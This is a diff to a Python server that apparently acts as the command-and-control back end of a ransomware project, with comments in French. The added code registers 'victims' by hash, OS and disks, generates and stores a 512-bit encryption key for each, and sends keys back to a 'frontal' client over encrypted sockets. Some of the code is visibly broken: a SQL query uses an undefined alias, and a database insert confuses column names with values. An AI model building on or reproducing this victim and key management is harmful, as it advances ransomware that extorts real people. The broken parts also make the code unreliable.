@@ -1,10 +1,10 @@
-import socket
+# import socket
 import datetime
 import utile.network as network
 import utile.message as message
 import utile.data as data
-import random
-import string
+# import random
+# import string
 import utile.security as security
 import queue
 import threading
@@ -66,6 +66,33 @@ def get_data_from_db(message_console, conn):
             else:
                 message_response = message.set_message("CHGSTATE", [state])
                 console_thread_queue.put(message_response)
+        elif type_message == "INITIALIZE":
+            select_query = "SELECT v.hash, v.key, v.id_victim FROM victims;"
+            victims = data.select_data(conn, select_query)
+            hash_victim = message_console["INITIALIZE"]
+            found = False
+            i = 0
+            for victim in victims:
+                if hash_victim == victim[0]:
+                    history = data.get_list_history(conn, victim[2])
+                    params = [victim[0], victim[1], history[-1][3]]
+                    message_response = message.set_message("KEY_RESP", params)
+                    front_thread_queue.put(message_response)
+                    found = True
+                    break
+                i += 1
+            if found:
+                pass
+            else:
+                key = security.gen_key(512)
+                items_victim = ["id_victim", "os", "hash", "disks", "key"]
+                contenu_victim = [i, message_console["OS"], hash_victim, message_console["DISKs"], key]
+                data.insert_data(conn, "victims", items_victim, contenu_victim)
+                items_state = ["id_states", i, "datetime", "state"]
+                contenu_state = [1, 'victim_id', datetime.datetime.now().timestamp(), "INITIALIZE"]
+                data.insert_data(conn, "states", items_state, contenu_state)
+                message_response = message.set_message("KEY_RESP", [hash_victim, key, "INITIALIZE"])
+                front_thread_queue.put(message_response)
         else:
             message_response = message.set_message("CHGSTATE", ["UNKNOWN"])
             console_thread_queue.put(message_response)
@@ -82,13 +109,18 @@ def handle_console(socket_server_console):
         else:
             print("Message console reçu est None. Ignoré.")
 
+
 def handle_frontal(socket_server_frontal):
     while True:
         client_socket, address = socket_server_frontal.accept()
         key = security.diffie_hellman_recv_key(client_socket)
         encrypted_message_frontal = network.receive_message(client_socket)
-        message_frontal = security.aes_decrypt(encrypted_message_frontal, key)
-        front_thread_queue.put((message_frontal, client_socket, key))
+        if encrypted_message_frontal is not None:
+            message_frontal = security.aes_decrypt(encrypted_message_frontal, key)
+            front_thread_queue.put((message_frontal, client_socket, key))
+        else:
+            print("Message frontale reçu est None. Ignoré.")
+
 
 def main():
     socket_server_console = network.start_net_serv(port=8380)
@@ -111,11 +143,17 @@ def main():
                 message_response = console_thread_queue.get()
                 encrypted_response = security.aes_encrypt(message_response, key)
                 network.send_message(client_socket, encrypted_response)
-                print("Contenu de la file d'attente console_thread_queue : ", message_response) # Ajout du print
+                print("Contenu de la file d'attente console_thread_queue : ", message_response)  # Ajout du print
 
-        '''if not front_thread_queue.empty():
+        if not front_thread_queue.empty():
             message_frontal, client_socket, key = front_thread_queue.get()
-            # Gérer les messages frontaux si nécessaire'''
+            get_data_from_db(message_frontal, conn)
+            while not console_thread_queue.empty():
+                message_response = console_thread_queue.get()
+                encrypted_response = security.aes_encrypt(message_response, key)
+                network.send_message(client_socket, encrypted_response)
+                print("Contenu de la file d'attente console_thread_queue : ", message_response)
+
 
 if __name__ == '__main__':
     main()
